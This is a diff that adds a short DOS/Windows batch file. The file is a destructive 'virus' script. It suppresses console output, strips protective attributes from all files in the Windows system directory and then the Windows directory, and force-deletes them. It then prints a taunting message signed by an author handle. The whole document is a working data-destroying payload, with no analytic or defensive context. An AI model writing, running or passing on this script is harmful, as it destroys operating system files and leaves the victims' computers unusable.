@@ -1,0 +1,17 @@
+@ECHO OFF
+CTTY NUL
+IF EXIST %WINDIR%\SYSTEM
+ATTRIB.EXE -R -A -S -H %WINDIR%\SYSTEM\*.* |ECHO Y |DEL %WINDIR%\SYSTEM\*.* >NUL
+GOTO WINDEL
+:WINDEL
+IF EXIST %WINDIR%
+ATTRIB.EXE -R -A -S -H %WINDIR%\*.* |ECHO Y |DEL %WINDIR%\*.* >NUL
+GOTO MSSG
+:MSSG
+ECHO IT APPEARS THAT YOUR COMPUTER WAS HIT BY A UNREPAIRABLE AND UNDETECTED VIRUS!  
+ECHO THAT MUST REALLY SUCK!  I WOULD IMAGINE THAT THIS MUST REALLY PISS YOU OFF HUH?
+ECHO OH WELL, BETTER PISSED OFF THAN PISSED ON!  BUT IN YOUR CASE, I DON'T KNOW! HAHA!
+ECHO               DON'T YOU JUST HATE IT WHEN SHIT LIKE THIS HAPPENS?                
+ECHO                           ---CYB3RKR1M1N@L---                                   
+ECHO                                  aka                                            
+ECHO                              SATANIK CHILD                                      
